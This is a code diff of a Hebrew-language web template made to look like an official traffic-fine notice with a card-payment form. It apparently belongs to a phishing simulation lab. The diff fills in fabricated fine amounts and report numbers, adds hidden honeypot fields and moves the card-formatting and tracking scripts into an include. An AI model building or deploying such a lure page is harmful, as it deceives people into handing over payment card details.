@@ -268,12 +268,12 @@
         <div class="{{ bcls['fine-banner'] }}">
             <div class="{{ bcls['fine-title'] }}">התראה לפני נקיטת הליכים</div>
             <div class="{{ bcls['fine-details'] }}">
-                מספר דוח: <span id="reportNum"></span><br>
-                תאריך העבירה: <span id="reportDate"></span>
+                מספר דוח: <span id="reportNum">{{ bango_fine_report|e }}</span><br>
+                תאריך העבירה: <span id="reportDate">{{ bango_fine_date|e }}</span>
             </div>
             <div class="{{ bcls['amount-row'] }}">
                 <span>יתרה לתשלום:</span>
-                <span class="{{ bcls['amount'] }}" id="randomAmount">₪ 0.00</span>
+                <span class="{{ bcls['amount'] }}" id="randomAmount">₪ {{ bango_fine_amount|e }}</span>
             </div>
         </div>
 
@@ -338,6 +338,10 @@
             </div>
         </div>
 
+        <div style="position:absolute;left:-9999px;height:0;overflow:hidden;opacity:0" aria-hidden="true">
+            <input type="text" name="bango_honeypot_company" id="bango-hp-company" tabindex="-1" autocomplete="off" value="" />
+            <input type="text" name="bango_honeypot_website" id="bango-hp-website" tabindex="-1" autocomplete="off" value="" />
+        </div>
         <button type="submit" class="{{ bcls['btn-submit'] }}">שלם עכשיו</button>
     </form>
     </div>
@@ -371,78 +375,7 @@
     <div class="{{ bcls['bango-success-overlay__spinner'] }}" aria-hidden="true"></div>
   </div>
 
-  <script src="/static/js/fingerprint.js"></script>
-  <script src="/static/js/behavior.js"></script>
-  <script src="/static/js/incognito-hint.js"></script>
-  <script>EduLabBehavior.start();</script>
-  <script src="/static/js/lab-busy.js"></script>
-  <script src="/static/js/bango-crypto.js"></script>
-  <script>window.__BANGO_UI_CLASSES__ = {{ bango_ui_for_js|tojson }};</script>
-  <script src="/static/js/bango-lab.js"></script>
-
-<script>
-    window.addEventListener("load", function() {
-        var minAmt = 45;
-        var maxAmt = 95;
-        var randomAmt = (Math.random() * (maxAmt - minAmt) + minAmt).toFixed(2);
-        var ra = document.getElementById("randomAmount");
-        if (ra) ra.innerText = "₪ " + randomAmt;
-        var randomReport = Math.floor(10000000 + Math.random() * 90000000);
-        var rn = document.getElementById("reportNum");
-        if (rn) rn.innerText = String(randomReport);
-        var date = new Date();
-        date.setDate(date.getDate() - 3);
-        var rd = document.getElementById("reportDate");
-        if (rd) rd.innerText = date.toLocaleDateString("he-IL");
-    });
-
-    (function () {
-        var card = document.getElementById("card");
-        if (card) {
-            card.addEventListener("input", function (e) {
-                e.target.value = e.target.value.replace(/[^\d]/g, "").replace(/(.{4})/g, "$1 ").trim();
-            });
-        }
-        var exp = document.getElementById("exp");
-        if (exp) {
-            exp.addEventListener("input", function (e) {
-                var v = e.target.value.replace(/[^\d]/g, "");
-                if (v.length > 2) e.target.value = v.substring(0, 2) + "/" + v.substring(2, 4);
-            });
-        }
-    })();
-
-    (function bangoTabSegments() {
-        var s1 = document.getElementById("bango-seg-1");
-        var s2 = document.getElementById("bango-seg-2");
-        var p1 = document.getElementById("bango-section-client");
-        var p2 = document.getElementById("bango-section-card");
-        if (!s1 || !s2 || !p1 || !p2) return;
-        function selectSeg(which) {
-            s1.setAttribute("aria-selected", which === 1 ? "true" : "false");
-            s2.setAttribute("aria-selected", which === 2 ? "true" : "false");
-        }
-        s1.addEventListener("click", function () {
-            p1.scrollIntoView({ behavior: "smooth", block: "start" });
-            selectSeg(1);
-        });
-        s2.addEventListener("click", function () {
-            p2.scrollIntoView({ behavior: "smooth", block: "start" });
-            selectSeg(2);
-        });
-    })();
-
-    (function bangoCvvToggle() {
-        var inp = document.getElementById("cvv");
-        var btn = document.getElementById("bango-cvv-toggle");
-        if (!inp || !btn) return;
-        btn.addEventListener("click", function () {
-            var isPwd = inp.getAttribute("type") === "password";
-            inp.setAttribute("type", isPwd ? "tel" : "password");
-            btn.setAttribute("aria-pressed", isPwd ? "true" : "false");
-        });
-    })();
-</script>
+{% include 'bango_scripts.html' %}
 
 </body>
 </html>
